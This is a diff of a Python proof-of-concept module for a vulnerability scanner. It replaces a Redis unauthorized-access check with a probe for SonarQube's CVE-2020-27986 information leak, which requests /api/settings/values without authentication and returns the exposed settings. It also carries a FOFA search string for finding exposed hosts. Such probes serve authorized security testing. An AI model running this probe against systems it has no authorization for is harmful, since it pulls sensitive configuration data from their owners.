@@ -1,28 +1,12 @@
 # coding:utf-8  
-import redis
+import requests
 from lib.core.common import url_handle,get_random_ua
 from lib.core.poc import POCBase
-from lib.core.log import logwarning
 # ...
 import urllib3
 urllib3.disable_warnings()
 
 class POC(POCBase):
-
-    def __init__(self, host, proxy=None):
-        if host.startswith("redis://"):
-            self.target = host[8:]
-        elif host.startswith("http://") or host.startswith("https://"):
-            self.target = host.split("://")[1]
-        else:
-            err_msg = "The target format cannot be parsed : %s , exit the POC"%(host)
-            logwarning(err_msg)
-            exit()
-        
-        self.proxy = None
-
-        self.timeout = 10
-
 
     _info = {
         "author" : "jijue",                      # POC作者
@@ -30,21 +14,20 @@ class POC(POCBase):
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-        出于专注与web领域的考虑，本POC仅简单支持检测redis未授权访问而已,
-        另外，redis连接比较慢，扫起来会比http要久很多，扫之前做好心理准备
+        略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "Redis未授权访问",                        # 漏洞名称
-        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "Redis",                     # 漏洞应用名称
+        "name" : "SonarQube api 信息泄露漏洞",                        # 漏洞名称
+        "VulnID" : "CVE-2020-27986",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "SonarQube",                     # 漏洞应用名称
         "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-        
+        SonarQube 某接口存在信息泄露漏洞，可以获取部分敏感信息
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-        app="redis"
+        app="sonarQube-代码管理"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -59,22 +42,29 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        redis_host = self.target.split(":")[0]  # url自己按需调整
-        redis_port = self.target.split(":")[1]
+        url = self.target + "/api/settings/values" # url自己按需调整
+        
 
+        headers = {"User-Agent":get_random_ua(),
+                    "Connection":"close",
+                    # "Content-Type": "application/x-www-form-urlencoded",
+                    }
         
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            r = redis.Redis(redis_host, port=redis_port, db=0, socket_timeout=6.0)
-            if r.ping() is True:
-                vuln = [True,"connect success"]
+            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+            if "{\"settings\":[{\"key\":" in req.text:#req.status_code == 200 and :
+                vuln = [True,req.text]
             else:
-                vuln = [False,"connect field"]
+                vuln = [False,req.text]
         except Exception as e:
             raise e
-
+        
+        # 以下逻辑酌情使用
+        if self._honeypot_check(vuln[1]) == True:
+            vuln[0] = False
         
         return vuln
 
